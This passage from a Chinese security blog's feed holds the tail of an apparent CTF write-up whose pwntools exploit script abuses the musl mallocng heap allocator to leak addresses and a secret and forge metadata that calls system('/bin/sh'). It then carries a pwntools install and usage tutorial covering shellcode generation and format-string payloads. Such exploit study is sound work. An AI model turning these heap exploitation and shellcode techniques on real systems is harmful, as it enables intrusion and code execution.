class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">new_key = (<span class="built_in">int</span>((random.random()) * <span class="built_in">int</span>((<span class="string">b&quot;\xff&quot;</span> * size).<span class="built_in">hex</span>(), <span class="number">16</span>)) % <span class="built_in">int</span>((<span class="string">b&quot;\xff&quot;</span> * size).<span class="built_in">hex</span>(), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">if</span> calc(key) == calc(new_key.to_bytes(size, <span class="string">&quot;little&quot;</span>)) :</span><br><span class="line"><span class="keyword">return</span> new_key.to_bytes(size, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fengshui1</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        store(<span class="string">b&quot;victim&quot;</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fengshui2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        query(<span class="string">b&quot;h&quot;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_leak</span>():</span><br><span class="line">    info = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        info = p.recv(<span class="number">2</span>) + info</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(info, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -- leak info --</span></span><br><span class="line">fengshui1(<span class="number">1</span>)</span><br><span class="line">fengshui2(<span class="number">5</span>) <span class="comment"># AFFFFFU</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak elf &amp; libc</span></span><br><span class="line">store(<span class="string">b&quot;hhhh&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x30</span>) <span class="comment"># [U]AAAA(U)U  [U] is KV, (U) is KV-&gt;value</span></span><br><span class="line">store(find_key(), <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">delete(<span class="string">b&quot;hhhh&quot;</span>) <span class="comment"># [F]AAAUFU</span></span><br><span class="line"></span><br><span class="line">fengshui2(<span class="number">3</span>) <span class="comment"># FFFFUFU</span></span><br><span class="line">store(<span class="string">b&quot;H\n&quot;</span>, <span class="string">b&quot;H&quot;</span>, <span class="number">0x1000</span>) <span class="comment"># AAAAU[U]U  [U] is the chunk we can get</span></span><br><span class="line"></span><br><span class="line">query(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">addr_mmap = get_leak() - <span class="number">0x20</span></span><br><span class="line">addr_libc = addr_mmap + <span class="number">0x4000</span></span><br><span class="line">addr_malloc_context = addr_libc + <span class="number">0xad9c0</span></span><br><span class="line">addr_elf = get_leak() - <span class="number">0xc8d0</span></span><br><span class="line">addr_hhhh = addr_elf + <span class="number">0xc890</span></span><br><span class="line">addr_KV = addr_elf + <span class="number">0xcde0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># leak secret</span></span><br><span class="line">delete(<span class="string">b&quot;H&quot;</span>) <span class="comment"># AAAAUFU</span></span><br><span class="line">fengshui2(<span class="number">2</span>) <span class="comment"># AAFFUFU</span></span><br><span class="line">KV = p64(addr_hhhh) + p64(addr_malloc_context) + p64(<span class="number">4</span>) + p64(<span class="number">0x30</span>) + p64(<span class="number">0x69052445</span>) + p64(<span class="number">0</span>)</span><br><span class="line">store(KV, <span class="string">b&quot;victim&quot;</span>) <span class="comment"># UUFFUFU</span></span><br><span class="line">query(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">secret = get_leak()</span><br><span class="line">get_leak()</span><br><span class="line">addr_heap = get_leak() - <span class="number">0x180</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;addr_elf: &quot;</span> + <span class="built_in">hex</span>(addr_elf))</span><br><span class="line">success(<span class="string">&quot;addr_mmap: &quot;</span> + <span class="built_in">hex</span>(addr_mmap))</span><br><span class="line">success(<span class="string">&quot;addr_libc: &quot;</span> + <span class="built_in">hex</span>(addr_libc))</span><br><span class="line">success(<span class="string">&quot;secret: &quot;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line"></span><br><span class="line"><span class="comment"># -- construct --</span></span><br><span class="line"></span><br><span class="line">delete(KV) <span class="comment"># FFAAUFU</span></span><br><span class="line"></span><br><span class="line">addr_system = addr_libc + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">addr_ofl_head = addr_libc + <span class="number">0xafd48</span></span><br><span class="line">addr_fake_meta_area = addr_mmap + <span class="number">0x1000</span></span><br><span class="line">addr_fake_meta = addr_fake_meta_area + <span class="number">0x18</span></span><br><span class="line">addr_fake_group = addr_fake_meta + <span class="number">0x28</span></span><br><span class="line">addr_fake_chunk = addr_fake_group + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = p64(addr_fake_chunk) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(addr_ofl_head) <span class="comment"># next </span></span><br><span class="line">fake_meta += p64(addr_fake_group) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># avail &amp; freed mask</span></span><br><span class="line">fake_meta += p64(last_idx | freeable &lt;&lt; <span class="number">5</span> | sc &lt;&lt; <span class="number">6</span> | maplen &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">active_idx = <span class="number">0</span></span><br><span class="line">fake_group = p64(addr_fake_meta)</span><br><span class="line">fake_group += p64(active_idx)</span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">fake_chunk += p64(addr_system) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_meta_area = <span class="string">b&quot;h&quot;</span> * <span class="number">0xfd0</span></span><br><span class="line">fake_meta_area += p64(secret) <span class="comment"># check</span></span><br><span class="line">fake_meta_area += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta_area += p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = fake_meta_area</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += fake_chunk</span><br><span class="line">payload += <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">store(payload, <span class="string">b&quot;victim&quot;</span>, <span class="number">0x1200</span>) <span class="comment"># FFAUUFU</span></span><br><span class="line">store(<span class="string">b&quot;victim&quot;</span>, <span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line">fengshui2(<span class="number">1</span>) <span class="comment"># AAUUUFU</span></span><br><span class="line">addr_hhhh = addr_hhhh + <span class="number">0xb0</span></span><br><span class="line">KV = p64(addr_hhhh) + p64(addr_fake_chunk) + p64(<span class="number">4</span>) + p64(<span class="number">0x80</span>) + p64(<span class="number">0x69052445</span>) + p64(<span class="number">0</span>)</span><br><span class="line">store(KV, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.xf1les.net/2021/11/03/mallocng-part-one/">musl libc 堆管理器 mallocng 详解 (Part I)</a></p><p><a href="https://www.anquanke.com/post/id/253566">从musl libc 1.1.24到1.2.2 学习pwn姿势</a></p><p><a href="https://blog.csdn.net/easy_level1/article/details/118606424">[阅读型]新版musl libc(1.2.2)堆管理之源码剖析！</a></p><p><a href="https://bbs.pediy.com/thread-269533-1.htm">[原创]musl 1.2.2 总结+源码分析 One</a></p><p><a href="http://pzhxbz.cn/?p=172">新版musl libc 浅析</a></p><p><a href="http://blog.leanote.com/post/xp0int/2022-%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int">2022-强网杯初赛-Writeup-By-Xp0int</a></p><p><a href="https://www.anquanke.com/post/id/241104">借助DefCon Quals 2021的mooosl学习musl mallocng</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;浅浅分析一下&lt;/p&gt;</summary>
    
    
    
    <category term="Computer Science" scheme="https://humoooor.cn/categories/Computer-Science/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
  </entry>
  
  <entry>
    <title>Pwntools 的安装及使用</title>
    <link href="https://humoooor.cn/2022/02/05/Pwntools%20%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <id>https://humoooor.cn/2022/02/05/Pwntools%20%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/</id>
    <published>2022-02-05T11:03:00.000Z</published>
    <updated>2023-03-31T08:07:52.716Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下安装 pwntools 的过程和基本使用</p><span id="more"></span><h2 id="Pwntools-安装"><a href="#Pwntools-安装" class="headerlink" title="Pwntools 安装"></a>Pwntools 安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>如果出现下面的 warning</p><blockquote><pre><code>WARNING: The scripts asm, checksec, common, constgrep, cyclic, debug, disablenx, disasm, elfdiff, elfpatch, errno, hex, main, phd, pwn, pwnstrip, scramble, shellcraft, template, unhex, update and version are installed in &#39;/home/yahu/.local/bin&#39; which is not on PATH.Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.</code></pre></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 .bashrc 文件添加</span></span><br><span class="line"><span class="built_in">export</span> PATH=~/.local/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment"># 然后 source 相应的文件即可</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><p>这样就可以直接使用 pwntools 自带的工具，如 checksec、cyclic 等</p><h2 id="Pwntools-使用"><a href="#Pwntools-使用" class="headerlink" title="Pwntools 使用"></a>Pwntools 使用</h2><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>用于查看文件的保护机制、架构信息等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h4 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h4><p>用于随机生成一串有序字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic 50</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br></pre></td></tr></table></figure><h3 id="常用-python-模块"><a href="#常用-python-模块" class="headerlink" title="常用 python 模块"></a>常用 python 模块</h3><h4 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置 系统、架构、日志输出等级</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386/amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="引入程序"><a href="#引入程序" class="headerlink" title="引入程序"></a>引入程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment"># 远程</span></span><br><span class="line">r = remote(<span class="string">&#x27;8.8.8.8&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="comment"># 本地</span></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"><span class="comment"># 最终进行交互</span></span><br><span class="line">r.interactive()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引入程序文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ELF</span>(<span class="params">path : <span class="built_in">str</span></span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">    = p.elf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取函数地址</span></span><br><span class="line">addr_func = elf.sym[<span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"><span class="comment"># 获取函数 plt 地址</span></span><br><span class="line">plt_func = elf.plt[<span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"><span class="comment"># 获取函数 got 地址</span></span><br><span class="line">got_func = elf.got[<span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="number">134514548</span></span><br></pre></td></tr></table></figure><h4 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">data : <span class="built_in">bytes</span></span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendafter</span>(<span class="params">delim : <span class="built_in">bytes</span>, data : <span class="built_in">bytes</span></span>)</span><br><span class="line">p.sendline(<span class="built_in">bytes</span>)</span><br><span class="line">p.sendlineafter(<span class="built_in">bytes</span>, <span class="built_in">bytes</span>)</span><br></pre></td></tr></table></figure><h4 id="接受数据"><a href="#接受数据" class="headerlink" title="接受数据"></a>接受数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recv()</span><br><span class="line">p.recv(<span class="built_in">int</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvuntil(<span class="built_in">bytes</span>)</span><br><span class="line">p.recvafter(<span class="built_in">bytes</span>)</span><br></pre></td></tr></table></figure><h4 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将数据打包成 n 位的二进制包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p8</span>(<span class="params">number : <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span></span><br><span class="line">p16(<span class="built_in">bytes</span>)</span><br><span class="line">p32(<span class="built_in">bytes</span>)</span><br><span class="line">p64(<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">114514</span>)</span><br><span class="line"><span class="string">b&#x27;R\xbf\x01\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 n 位的二进制包解包成数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u8</span>(<span class="params">number : <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span></span><br><span class="line">u16(<span class="built_in">int</span>)</span><br><span class="line">u32(<span class="built_in">int</span>)</span><br><span class="line">u64(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>u32(<span class="string">b&#x27;R\xbf\x01\x00&#x27;</span>)</span><br><span class="line"><span class="number">114514</span></span><br></pre></td></tr></table></figure><h4 id="其他常用"><a href="#其他常用" class="headerlink" title="其他常用"></a>其他常用</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 格式化字符串漏洞利用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_payload</span>(<span class="params">offset : <span class="built_in">int</span> , writes : <span class="built_in">map</span></span>) -&gt; <span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移为1，将地址为2的值修改成3，将地址为6的值修改成7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fmtstr_payload(<span class="number">1</span>, &#123;<span class="number">2</span> : <span class="number">3</span>, <span class="number">6</span> : <span class="number">7</span>&#125;)</span><br><span class="line"><span class="string">b&#x27;%3c%6$lln%4c%7$hhnaa\x02\x00\x00\x00\x06\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 shellcode 字符串，会随架构设置而生成对应的 shellcode</span></span><br><span class="line">shellcraft.sh()</span><br><span class="line">shellcraft.i386.sh()</span><br><span class="line">shellcraft.amd64.sh()</span><br><span class="line">shellcraft.arm.sh()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串形式的汇编转成机器码</span></span><br><span class="line">asm()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(shellcraft.sh())</span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a>一般流程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;8.8.8.8&#x27;, 8888)</span></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一下安装 pwntools 的过程和基本使用&lt;/p&gt;</summary>
    
    
    
    <category term="Tools" scheme="https://humoooor.cn/categories/Tools/"/>
    
    
    <category term="Pwn" scheme="https://humoooor.cn/tags/Pwn/"/>
    
  </entry>
  
</feed>
